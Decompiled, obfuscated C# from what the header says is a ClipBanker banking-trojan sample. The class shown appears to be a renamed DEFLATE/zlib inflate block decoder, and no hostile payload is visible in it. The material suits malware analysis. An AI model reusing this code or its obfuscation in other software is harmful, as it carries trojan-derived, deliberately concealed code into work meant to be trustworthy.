// Decompiled with JetBrains decompiler
// Type: U2D.92I
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00383s;
using A5m;
using dG3;
using r6A;
using System;
using System.Runtime.InteropServices;
using y3S;

namespace U2D
{
  internal sealed class \u00392I
  {
    internal static readonly int[] \u003449 = new int[19]
    {
      16,
      17,
      18,
      0,
      8,
      7,
      9,
      6,
      10,
      5,
      11,
      4,
      12,
      3,
      13,
      2,
      14,
      1,
      15
    };
    private \u00392I.\u003371 \u003347;
    internal int dvb;
    internal int k4h;
    internal int u6w;
    internal int[] \u0034W3;
    internal int[] \u0033ss = new int[1];
    internal int[] IU5 = new int[1];
    internal PV3 \u00313R = new PV3();
    internal int E73;
    internal \u0033t2 fc5;
    internal int x64;
    internal int Ufv;
    internal int[] ZD9;
    internal byte[] J5t;
    internal int \u0034u3;
    internal int \u0032Ro;
    internal int xT1;
    internal object \u00327V;
    internal uint f4Y;
    internal \u0039Q5 yMR = new \u0039Q5();

    internal \u00392I([In] \u0033t2 obj0, [In] object obj1, [In] int obj2)
    {
      this.fc5 = obj0;
      this.ZD9 = new int[4320];
      this.J5t = new byte[obj2];
      this.\u0034u3 = obj2;
      this.\u00327V = obj1;
      this.\u003347 = \u00392I.\u003371.\u0023a;
      int num = (int) this.\u00359q();
    }

    internal uint \u00359q()
    {
      int f4Y = (int) this.f4Y;
      this.\u003347 = \u00392I.\u003371.\u0023a;
      this.x64 = 0;
      this.Ufv = 0;
      this.\u0032Ro = this.xT1 = 0;
      if (this.\u00327V == null)
        return (uint) f4Y;
      this.fc5.Bd1 = this.f4Y = \u003232.\u0033bv(0U, (byte[]) null, 0, 0);
      return (uint) f4Y;
    }

    internal int FGy([In] int obj0)
    {
      int x7k = this.fc5.X7k;
      int num1 = this.fc5.\u0032Dc;
      int num2 = this.Ufv;
      int num3 = this.x64;
      int destinationIndex = this.xT1;
      int num4 = destinationIndex < this.\u0032Ro ? this.\u0032Ro - destinationIndex - 1 : this.\u0034u3 - destinationIndex;
      int num5;
      int num6;
      while (true)
      {
        int length1;
        do
        {
          switch (this.\u003347)
          {
            case \u00392I.\u003371.\u0023a:
              for (; num3 < 3; num3 += 8)
              {
                if (num1 != 0)
                {
                  obj0 = 0;
                  --num1;
                  num2 |= ((int) this.fc5.\u0033Dp[x7k++] & (int) byte.MaxValue) << num3;
                }
                else
                {
                  this.Ufv = num2;
                  this.x64 = num3;
                  this.fc5.\u0032Dc = num1;
                  this.fc5.m21 += (long) (x7k - this.fc5.X7k);
                  this.fc5.X7k = x7k;
                  this.xT1 = destinationIndex;
                  return this.\u0034z4(obj0);
                }
              }
              int num7 = num2 & 7;
              this.E73 = num7 & 1;
              switch ((uint) num7 >> 1)
              {
                case 0:
                  int num8 = num2 >> 3;
                  int num9 = num3 - 3;
                  int num10 = num9 & 7;
                  num2 = num8 >> num10;
                  num3 = num9 - num10;
                  this.\u003347 = \u00392I.\u003371.\u0023b;
                  continue;
                case 1:
                  int[] numArray1 = new int[1];
                  int[] numArray2 = new int[1];
                  int[][] numArray3 = new int[1][];
                  int[][] numArray4 = new int[1][];
                  \u0039Q5.\u003311(numArray1, numArray2, numArray3, numArray4, this.fc5);
                  this.\u00313R.PC6(numArray1[0], numArray2[0], numArray3[0], 0, numArray4[0], 0);
                  num2 >>= 3;
                  num3 -= 3;
                  this.\u003347 = \u00392I.\u003371.\u0023g;
                  continue;
                case 2:
                  num2 >>= 3;
                  num3 -= 3;
                  this.\u003347 = \u00392I.\u003371.\u0023d;
                  continue;
                case 3:
                  int num11 = num2 >> 3;
                  int num12 = num3 - 3;
                  this.\u003347 = \u00392I.\u003371.\u0023j;
                  this.fc5.\u00335v = "invalid block type";
                  obj0 = -3;
                  this.Ufv = num11;
                  this.x64 = num12;
                  this.fc5.\u0032Dc = num1;
                  this.fc5.m21 += (long) (x7k - this.fc5.X7k);
                  this.fc5.X7k = x7k;
                  this.xT1 = destinationIndex;
                  return this.\u0034z4(obj0);
                default:
                  continue;
              }
            case \u00392I.\u003371.\u0023b:
              for (; num3 < 32; num3 += 8)
              {
                if (num1 != 0)
                {
                  obj0 = 0;
                  --num1;
                  num2 |= ((int) this.fc5.\u0033Dp[x7k++] & (int) byte.MaxValue) << num3;
                }
                else
                {
                  this.Ufv = num2;
                  this.x64 = num3;
                  this.fc5.\u0032Dc = num1;
                  this.fc5.m21 += (long) (x7k - this.fc5.X7k);
                  this.fc5.X7k = x7k;
                  this.xT1 = destinationIndex;
                  return this.\u0034z4(obj0);
                }
              }
              if ((~num2 >> 16 & (int) ushort.MaxValue) != (num2 & (int) ushort.MaxValue))
              {
                this.\u003347 = \u00392I.\u003371.\u0023j;
                this.fc5.\u00335v = "invalid stored block lengths";
                obj0 = -3;
                this.Ufv = num2;
                this.x64 = num3;
                this.fc5.\u0032Dc = num1;
                this.fc5.m21 += (long) (x7k - this.fc5.X7k);
                this.fc5.X7k = x7k;
                this.xT1 = destinationIndex;
                return this.\u0034z4(obj0);
              }
              this.dvb = num2 & (int) ushort.MaxValue;
              num2 = num3 = 0;
              this.\u003347 = this.dvb != 0 ? \u00392I.\u003371.\u0023c : (this.E73 != 0 ? \u00392I.\u003371.\u0023h : \u00392I.\u003371.\u0023a);
              continue;
            case \u00392I.\u003371.\u0023c:
              if (num1 == 0)
              {
                this.Ufv = num2;
                this.x64 = num3;
                this.fc5.\u0032Dc = num1;
                this.fc5.m21 += (long) (x7k - this.fc5.X7k);
                this.fc5.X7k = x7k;
                this.xT1 = destinationIndex;
                return this.\u0034z4(obj0);
              }
              if (num4 == 0)
              {
                if (destinationIndex == this.\u0034u3 && this.\u0032Ro != 0)
                {
                  destinationIndex = 0;
                  num4 = destinationIndex < this.\u0032Ro ? this.\u0032Ro - destinationIndex - 1 : this.\u0034u3 - destinationIndex;
                }
                if (num4 == 0)
                {
                  this.xT1 = destinationIndex;
                  obj0 = this.\u0034z4(obj0);
                  destinationIndex = this.xT1;
                  num4 = destinationIndex < this.\u0032Ro ? this.\u0032Ro - destinationIndex - 1 : this.\u0034u3 - destinationIndex;
                  if (destinationIndex == this.\u0034u3 && this.\u0032Ro != 0)
                  {
                    destinationIndex = 0;
                    num4 = destinationIndex < this.\u0032Ro ? this.\u0032Ro - destinationIndex - 1 : this.\u0034u3 - destinationIndex;
                  }
                  if (num4 == 0)
                  {
                    this.Ufv = num2;
                    this.x64 = num3;
                    this.fc5.\u0032Dc = num1;
                    this.fc5.m21 += (long) (x7k - this.fc5.X7k);
                    this.fc5.X7k = x7k;
                    this.xT1 = destinationIndex;
                    return this.\u0034z4(obj0);
                  }
                }
              }
              obj0 = 0;
              length1 = this.dvb;
              if (length1 > num1)
                length1 = num1;
              if (length1 > num4)
                length1 = num4;
              Array.Copy((Array) this.fc5.\u0033Dp, x7k, (Array) this.J5t, destinationIndex, length1);
              x7k += length1;
              num1 -= length1;
              destinationIndex += length1;
              num4 -= length1;
              continue;
            case \u00392I.\u003371.\u0023d:
              goto label_37;
            case \u00392I.\u003371.\u0023e:
              goto label_49;
            case \u00392I.\u003371.\u0023f:
              goto label_57;
            case \u00392I.\u003371.\u0023g:
              goto label_79;
            case \u00392I.\u003371.\u0023h:
              goto label_84;
            case \u00392I.\u003371.\u0023i:
              goto label_87;
            case \u00392I.\u003371.\u0023j:
              goto label_88;
            default:
              goto label_89;
          }
        }
        while ((this.dvb -= length1) != 0);
        this.\u003347 = this.E73 != 0 ? \u00392I.\u003371.\u0023h : \u00392I.\u003371.\u0023a;
        continue;
label_37:
        for (; num3 < 14; num3 += 8)
        {
          if (num1 != 0)
          {
            obj0 = 0;
            --num1;
            num2 |= ((int) this.fc5.\u0033Dp[x7k++] & (int) byte.MaxValue) << num3;
          }
          else
          {
            this.Ufv = num2;
            this.x64 = num3;
            this.fc5.\u0032Dc = num1;
            this.fc5.m21 += (long) (x7k - this.fc5.X7k);
            this.fc5.X7k = x7k;
            this.xT1 = destinationIndex;
            return this.\u0034z4(obj0);
          }
        }
        int num13;
        this.k4h = num13 = num2 & 16383;
        if ((num13 & 31) <= 29 && (num13 >> 5 & 31) <= 29)
        {
          int length2 = 258 + (num13 & 31) + (num13 >> 5 & 31);
          if (this.\u0034W3 == null || this.\u0034W3.Length < length2)
            this.\u0034W3 = new int[length2];
          else
            Array.Clear((Array) this.\u0034W3, 0, length2);
          num2 >>= 14;
          num3 -= 14;
          this.u6w = 0;
          this.\u003347 = \u00392I.\u003371.\u0023e;
        }
        else
          break;
label_49:
        while (this.u6w < 4 + (this.k4h >> 10))
        {
          for (; num3 < 3; num3 += 8)
          {
            if (num1 != 0)
            {
              obj0 = 0;
              --num1;
              num2 |= ((int) this.fc5.\u0033Dp[x7k++] & (int) byte.MaxValue) << num3;
            }
            else
            {
              this.Ufv = num2;
              this.x64 = num3;
              this.fc5.\u0032Dc = num1;
              this.fc5.m21 += (long) (x7k - this.fc5.X7k);
              this.fc5.X7k = x7k;
              this.xT1 = destinationIndex;
              return this.\u0034z4(obj0);
            }
          }
          this.\u0034W3[\u00392I.\u003449[this.u6w++]] = num2 & 7;
          num2 >>= 3;
          num3 -= 3;
        }
        while (this.u6w < 19)
          this.\u0034W3[\u00392I.\u003449[this.u6w++]] = 0;
        this.\u0033ss[0] = 7;
        num5 = this.yMR.\u00396r(this.\u0034W3, this.\u0033ss, this.IU5, this.ZD9, this.fc5);
        if (num5 == 0)
        {
          this.u6w = 0;
          this.\u003347 = \u00392I.\u003371.\u0023f;
        }
        else
          goto label_53;
label_57:
        while (true)
        {
          int k4h1 = this.k4h;
          if (this.u6w < 258 + (k4h1 & 31) + (k4h1 >> 5 & 31))
          {
            int index1;
            for (index1 = this.\u0033ss[0]; num3 < index1; num3 += 8)
            {
              if (num1 != 0)
              {
                obj0 = 0;
                --num1;
                num2 |= ((int) this.fc5.\u0033Dp[x7k++] & (int) byte.MaxValue) << num3;
              }
              else
              {
                this.Ufv = num2;
                this.x64 = num3;
                this.fc5.\u0032Dc = num1;
                this.fc5.m21 += (long) (x7k - this.fc5.X7k);
                this.fc5.X7k = x7k;
                this.xT1 = destinationIndex;
                return this.\u0034z4(obj0);
              }
            }
            int index2 = this.ZD9[(this.IU5[0] + (num2 & u4W.bc1[index1])) * 3 + 1];
            int num14 = this.ZD9[(this.IU5[0] + (num2 & u4W.bc1[index2])) * 3 + 2];
            if (num14 < 16)
            {
              num2 >>= index2;
              num3 -= index2;
              this.\u0034W3[this.u6w++] = num14;
            }
            else
            {
              int index3 = num14 == 18 ? 7 : num14 - 14;
              int num15 = num14 == 18 ? 11 : 3;
              for (; num3 < index2 + index3; num3 += 8)
              {
                if (num1 != 0)
                {
                  obj0 = 0;
                  --num1;
                  num2 |= ((int) this.fc5.\u0033Dp[x7k++] & (int) byte.MaxValue) << num3;
                }
                else
                {
                  this.Ufv = num2;
                  this.x64 = num3;
                  this.fc5.\u0032Dc = num1;
                  this.fc5.m21 += (long) (x7k - this.fc5.X7k);
                  this.fc5.X7k = x7k;
                  this.xT1 = destinationIndex;
                  return this.\u0034z4(obj0);
                }
              }
              int num16 = num2 >> index2;
              int num17 = num3 - index2;
              int num18 = num15 + (num16 & u4W.bc1[index3]);
              num2 = num16 >> index3;
              num3 = num17 - index3;
              int u6w = this.u6w;
              int k4h2 = this.k4h;
              if (u6w + num18 <= 258 + (k4h2 & 31) + (k4h2 >> 5 & 31) && (num14 != 16 || u6w >= 1))
              {
                int num19 = num14 == 16 ? this.\u0034W3[u6w - 1] : 0;
                do
                {
                  this.\u0034W3[u6w++] = num19;
                }
                while (--num18 != 0);
                this.u6w = u6w;
              }
              else
                goto label_71;
            }
          }
          else
            break;
        }
        this.IU5[0] = -1;
        int[] numArray5 = new int[1]{ 9 };
        int[] numArray6 = new int[1]{ 6 };
        int[] numArray7 = new int[1];
        int[] numArray8 = new int[1];
        int k4h = this.k4h;
        num6 = this.yMR.\u0034SJ(257 + (k4h & 31), 1 + (k4h >> 5 & 31), this.\u0034W3, numArray5, numArray6, numArray7, numArray8, this.ZD9, this.fc5);
        switch (num6)
        {
          case -3:
            goto label_76;
          case 0:
            this.\u00313R.PC6(numArray5[0], numArray6[0], this.ZD9, numArray7[0], this.ZD9, numArray8[0]);
            this.\u003347 = \u00392I.\u003371.\u0023g;
            break;
          default:
            goto label_77;
        }
label_79:
        this.Ufv = num2;
        this.x64 = num3;
        this.fc5.\u0032Dc = num1;
        this.fc5.m21 += (long) (x7k - this.fc5.X7k);
        this.fc5.X7k = x7k;
        this.xT1 = destinationIndex;
        obj0 = this.\u00313R.VA9(this, obj0);
        if (obj0 == 1)
        {
          obj0 = 0;
          x7k = this.fc5.X7k;
          num1 = this.fc5.\u0032Dc;
          num2 = this.Ufv;
          num3 = this.x64;
          destinationIndex = this.xT1;
          num4 = destinationIndex < this.\u0032Ro ? this.\u0032Ro - destinationIndex - 1 : this.\u0034u3 - destinationIndex;
          if (this.E73 == 0)
            this.\u003347 = \u00392I.\u003371.\u0023a;
          else
            goto label_83;
        }
        else
          goto label_80;
      }
      this.\u003347 = \u00392I.\u003371.\u0023j;
      this.fc5.\u00335v = "too many length or distance symbols";
      obj0 = -3;
      this.Ufv = num2;
      this.x64 = num3;
      this.fc5.\u0032Dc = num1;
      this.fc5.m21 += (long) (x7k - this.fc5.X7k);
      this.fc5.X7k = x7k;
      this.xT1 = destinationIndex;
      return this.\u0034z4(obj0);
label_53:
      obj0 = num5;
      if (obj0 == -3)
      {
        this.\u0034W3 = (int[]) null;
        this.\u003347 = \u00392I.\u003371.\u0023j;
      }
      this.Ufv = num2;
      this.x64 = num3;
      this.fc5.\u0032Dc = num1;
      this.fc5.m21 += (long) (x7k - this.fc5.X7k);
      this.fc5.X7k = x7k;
      this.xT1 = destinationIndex;
      return this.\u0034z4(obj0);
label_71:
      this.\u0034W3 = (int[]) null;
      this.\u003347 = \u00392I.\u003371.\u0023j;
      this.fc5.\u00335v = "invalid bit length repeat";
      obj0 = -3;
      this.Ufv = num2;
      this.x64 = num3;
      this.fc5.\u0032Dc = num1;
      this.fc5.m21 += (long) (x7k - this.fc5.X7k);
      this.fc5.X7k = x7k;
      this.xT1 = destinationIndex;
      return this.\u0034z4(obj0);
label_76:
      this.\u0034W3 = (int[]) null;
      this.\u003347 = \u00392I.\u003371.\u0023j;
label_77:
      obj0 = num6;
      this.Ufv = num2;
      this.x64 = num3;
      this.fc5.\u0032Dc = num1;
      this.fc5.m21 += (long) (x7k - this.fc5.X7k);
      this.fc5.X7k = x7k;
      this.xT1 = destinationIndex;
      return this.\u0034z4(obj0);
label_80:
      return this.\u0034z4(obj0);
label_83:
      this.\u003347 = \u00392I.\u003371.\u0023h;
label_84:
      this.xT1 = destinationIndex;
      obj0 = this.\u0034z4(obj0);
      destinationIndex = this.xT1;
      int num20 = destinationIndex < this.\u0032Ro ? this.\u0032Ro - destinationIndex - 1 : this.\u0034u3 - destinationIndex;
      if (this.\u0032Ro != this.xT1)
      {
        this.Ufv = num2;
        this.x64 = num3;
        this.fc5.\u0032Dc = num1;
        this.fc5.m21 += (long) (x7k - this.fc5.X7k);
        this.fc5.X7k = x7k;
        this.xT1 = destinationIndex;
        return this.\u0034z4(obj0);
      }
      this.\u003347 = \u00392I.\u003371.\u0023i;
label_87:
      obj0 = 1;
      this.Ufv = num2;
      this.x64 = num3;
      this.fc5.\u0032Dc = num1;
      this.fc5.m21 += (long) (x7k - this.fc5.X7k);
      this.fc5.X7k = x7k;
      this.xT1 = destinationIndex;
      return this.\u0034z4(obj0);
label_88:
      obj0 = -3;
      this.Ufv = num2;
      this.x64 = num3;
      this.fc5.\u0032Dc = num1;
      this.fc5.m21 += (long) (x7k - this.fc5.X7k);
      this.fc5.X7k = x7k;
      this.xT1 = destinationIndex;
      return this.\u0034z4(obj0);
label_89:
      obj0 = -2;
      this.Ufv = num2;
      this.x64 = num3;
      this.fc5.\u0032Dc = num1;
      this.fc5.m21 += (long) (x7k - this.fc5.X7k);
      this.fc5.X7k = x7k;
      this.xT1 = destinationIndex;
      return this.\u0034z4(obj0);
    }

    internal void eC9()
    {
      int num = (int) this.\u00359q();
      this.J5t = (byte[]) null;
      this.ZD9 = (int[]) null;
    }

    internal void \u003834([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      Array.Copy((Array) obj0, obj1, (Array) this.J5t, 0, obj2);
      this.\u0032Ro = this.xT1 = obj2;
    }

    internal int \u0034z4([In] int obj0)
    {
      for (int index = 0; index < 2; ++index)
      {
        int length = index != 0 ? this.xT1 - this.\u0032Ro : (this.\u0032Ro <= this.xT1 ? this.xT1 : this.\u0034u3) - this.\u0032Ro;
        if (length == 0)
        {
          if (obj0 == -5)
            obj0 = 0;
          return obj0;
        }
        if (length > this.fc5.\u0031G5)
          length = this.fc5.\u0031G5;
        if (length != 0 && obj0 == -5)
          obj0 = 0;
        this.fc5.\u0031G5 -= length;
        this.fc5.\u00314Z += (long) length;
        if (this.\u00327V != null)
          this.fc5.Bd1 = this.f4Y = \u003232.\u0033bv(this.f4Y, this.J5t, this.\u0032Ro, length);
        Array.Copy((Array) this.J5t, this.\u0032Ro, (Array) this.fc5.H2D, this.fc5.\u00338b, length);
        this.fc5.\u00338b += length;
        this.\u0032Ro += length;
        if (this.\u0032Ro == this.\u0034u3 && index == 0)
        {
          this.\u0032Ro = 0;
          if (this.xT1 == this.\u0034u3)
            this.xT1 = 0;
        }
        else
          ++index;
      }
      return obj0;
    }

    private enum \u003371
    {
      \u0023a,
      \u0023b,
      \u0023c,
      \u0023d,
      \u0023e,
      \u0023f,
      \u0023g,
      \u0023h,
      \u0023i,
      \u0023j,
    }
  }
}
